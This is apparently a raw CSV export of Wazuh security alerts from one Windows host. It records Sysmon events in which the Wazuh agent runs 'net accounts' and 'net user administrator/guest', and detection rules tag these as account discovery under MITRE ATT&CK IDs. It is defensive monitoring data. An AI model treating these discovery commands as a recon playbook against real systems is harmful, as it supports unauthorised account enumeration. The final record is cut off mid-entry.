wazuh-alerts-4.x-2024.11.30,jfq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T06:21:38.717634800Z,2049,1608,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,1,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:39.769",EventChannel,1732947699.207262,"Nov 30, 2024 @ 06:21:39.769", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,kPq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.494
ProcessGuid: {15959494-AEF3-674A-0E05-000000000D00}
ProcessId: 736
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.495764300Z,53950,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.266",EventChannel,1732947700.222404,"Nov 30, 2024 @ 06:21:40.266", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,736, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-0E05-000000000D00},2024-11-30 06:21:39.494,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,k_q7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.906
ProcessGuid: {15959494-AEF3-674A-1305-000000000D00}
ProcessId: 3664
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF3-674A-1105-000000000D00}
ParentProcessId: 3660
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.907509500Z,53954,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,6,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.329",EventChannel,1732947700.240232,"Nov 30, 2024 @ 06:21:40.329", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,3664, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-1305-000000000D00},2024-11-30 06:21:39.906,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF3-674A-1105-000000000D00},net.exe accounts,0x3e7,3660,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lvq7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:39.972
ProcessGuid: {15959494-AEF3-674A-1705-000000000D00}
ProcessId: 536
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:39.973403700Z,53957,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,9,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.376",EventChannel,1732947700.257898,"Nov 30, 2024 @ 06:21:40.376", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,536, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF3-674A-1705-000000000D00},2024-11-30 06:21:39.972,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,m_q7e5MBRlc-D5DFcxy7,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:40.139
ProcessGuid: {15959494-AEF4-674A-1F05-000000000D00}
ProcessId: 4568
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF4-674A-1D05-000000000D00}
ParentProcessId: 6944
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net.exe accounts
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:40.140279100Z,53962,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,14,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:40.454",EventChannel,1732947700.287560,"Nov 30, 2024 @ 06:21:40.454", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,4568, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF4-674A-1F05-000000000D00},2024-11-30 06:21:40.139,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF4-674A-1D05-000000000D00},net.exe accounts,0x3e7,6944,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,nvq7e5MBRlc-D5DFdhxc,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:40.212
ProcessGuid: {15959494-AEF4-674A-2005-000000000D00}
ProcessId: 8000
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net.exe accounts
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:40.212800100Z,53963,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,15,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:41.268",EventChannel,1732947701.295366,"Nov 30, 2024 @ 06:21:41.268", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,8000, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF4-674A-2005-000000000D00},2024-11-30 06:21:40.212,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net.exe accounts,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,oPq7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam,"hr=0xC004C003, 00010001(0x00000000, 09:51:40:445 - https://activation-v2.sls.microsoft.com/SLActivateProduct/SLActivateProduct.asmx?configextension=Retail)  00020001(0x00000000, 09:51:40:492)  00030001(0x00000000, 09:51:40:492 - https://activation-v2.sls.microsoft.com)  00030002(0x00000000, 09:51:40:492 - 0)  00040001(0x00000000, 09:51:40:492 - https://activation-v2.sls.microsoft.com)  00040002(0x00000000, 09:51:40:507 - 1, &lt;NULL&gt;, &lt;NULL&gt;, &lt;NULL&gt;)  00050002(0x80072F94, 09:51:40:507 - 0, 1)  00040006(0x00000001, 09:51:40:507 - 0, https://activation-v2.sls.microsoft.com, &lt;N/A&gt;, &lt;N/A&gt;)  00020005(0x00000000, 09:51:40:507 - 0)  0002000C(0x00000000, 09:51:42:148 - 500)  00010002(0x8004FC01, 09:51:42:148 - &lt;?xml version=\""1.0\"" encoding=\""utf-8\""?&gt;&lt;soap:Envelope xmlns:soap=\""http://schemas.xmlsoap.org/soap/envelope/\"" xmlns:xsi=\""http://www.w3.org/2001/XMLSchema-instance\"" xmlns:xsd=\""http://www.w3.org/2001/XMLSchema\""&gt;&lt;soap:Body&gt;&lt;soap:Fault&gt;&lt;faultcode&gt;soap:Server&lt;/faultcode&gt;&lt;faultstring&gt;SoapException&lt;/faultstring&gt;&lt;detail&gt;&lt;HRESULT&gt;0xC004C003&lt;/HRESULT&gt;&lt;Messages&gt;&lt;Message&gt;103 (Activation) - [PA Product key blocked.  ---&amp;gt; Product key blocked]&lt;/Message&gt;&lt;/Messages&gt;&lt;/detail&gt;&lt;/soap:Fault&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;)  00010003(0x8004FC01, 09:51:42:148)",8200,Software Protection Platform Service,0x80000000000000,{E23B33B0-C8C9-472C-A5F9-F2BDFEA0F156},2,Application,0,"""License acquisition failure details. 
hr=0xC004C003""",0,2024-11-30T06:21:42.148612800Z,2136,0,DESKTOP-QGB4EQH,0,0,ERROR,Microsoft-Windows-Security-SPP,1,false,9,Windows application error event.,"[""windows"",""windows_application"",""system_error""]",60602,"[""IV_35.7.d""]","[""4.3""]",windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.220",EventChannel,1732947702.307200,"Nov 30, 2024 @ 06:21:42.220", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ovq7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,7, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-11-30 06:21:41.382
ProcessGuid: {15959494-AEE0-674A-F404-000000000D00}
ProcessId: 4472
Image: C:\Windows\System32\DeviceCensus.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=47221E645D323256A4B0B12B09891E30789EFECC,MD5=46EBDA1D65D32F2D329B8051D039F801,SHA256=52E960EDCCAEF5BB2BCD16627F3FB51BF43D1E97B4BD29D86A72172D0BF1022E,IMPHASH=88AA0B6E4721D06B33225AE5D36F7D6F
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-11-30T06:21:41.400583800Z,53967,1756,DESKTOP-QGB4EQH,7,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.455",EventChannel,1732947702.313076,"Nov 30, 2024 @ 06:21:42.455", , , , , , , , , , , , ,4472, , , , , , , , , , ,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , ,taskschd.dll,C:\\Windows\\System32\\DeviceCensus.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,true,Valid,{15959494-AEE0-674A-F404-000000000D00},2024-11-30 06:21:41.382,"SHA1=47221E645D323256A4B0B12B09891E30789EFECC,MD5=46EBDA1D65D32F2D329B8051D039F801,SHA256=52E960EDCCAEF5BB2BCD16627F3FB51BF43D1E97B4BD29D86A72172D0BF1022E,IMPHASH=88AA0B6E4721D06B33225AE5D36F7D6F","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,pfq7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1087.001,technique_name=Local Account
UtcTime: 2024-11-30 06:21:41.486
ProcessGuid: {15959494-AEF5-674A-2805-000000000D00}
ProcessId: 7164
Image: C:\Windows\SysWOW64\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net user administrator
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570
ParentProcessGuid: {15959494-D386-6749-3400-000000000D00}
ParentProcessId: 2484
ParentImage: C:\Program Files (x86)\ossec-agent\wazuh-agent.exe
ParentCommandLine: ""C:\Program Files (x86)\ossec-agent\wazuh-agent.exe""
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.486878000Z,53972,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.555",EventChannel,1732947702.329624,"Nov 30, 2024 @ 06:21:42.555", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,7164, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net.exe,C:\\Windows\\SysWOW64\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-2805-000000000D00},2024-11-30 06:21:41.486,"SHA1=0196B4A47B33A74999B50044FC62516F01B9A7D7,MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570","technique_id=T1087.001,technique_name=Local Account",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D386-6749-3400-000000000D00},"\""C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe\""",0x3e7,2484,C:\\Program Files (x86)\\ossec-agent\\,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,net user administrator,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,pvq7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:41.521
ProcessGuid: {15959494-AEF5-674A-2A05-000000000D00}
ProcessId: 732
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 user administrator
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF5-674A-2805-000000000D00}
ParentProcessId: 7164
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net user administrator
ParentUser: NT AUTHORITY\SYSTEM""",5,2024-11-30T06:21:41.521613700Z,53973,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,3,A net.exe account discovery command was initiated,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92039, , ,windows_eventchannel,log,"Nov 30, 2024 @ 06:21:42.579",EventChannel,1732947702.335648,"Nov 30, 2024 @ 06:21:42.579", , , , , , , ,{15959494-D382-6749-E703-000000000000}, , , , ,732, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\SysWOW64\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-AEF5-674A-2A05-000000000D00},2024-11-30 06:21:41.521,"SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-AEF5-674A-2805-000000000D00},net user administrator,0x3e7,7164,C:\\Program Files (x86)\\ossec-agent\\,C:\\Windows\\SysWOW64\\net.exe,C:\\Windows\\system32\\net1 user administrator,System,0,NT AUTHORITY\\SYSTEM, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,qPq7e5MBRlc-D5DFeBy4,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 06:21:41.582
ProcessGuid: {15959494-AEF5-674A-2D05-000000000D00}
ProcessId: 2384
Image: C:\Windows\SysWOW64\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 user guest
CurrentDirectory: C:\Program Files (x86)\ossec-agent\
User: NT AUTHORITY\SYSTEM
LogonGuid: {15959494-D382-6749-E703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=83CB47100EFFB110ACBE65BC1EE7D459B7ECF983,MD5=B5A26C2BF17222E86B91D26F1247AF3E,SHA256=14CC5BE4C833ACC652195DEAD113E1C3B4AC0B98EA1AEAD11957836F9AE721CF,IMPHASH=3D3E7537BD3BA07738DC5CA8AD01B073
ParentProcessGuid: {15959494-AEF5-674A-2B05-000000000D00}
ParentProcessId: 4120
ParentImage: C:\Windows\SysWOW64\net.exe
ParentCommandLine: net user guest
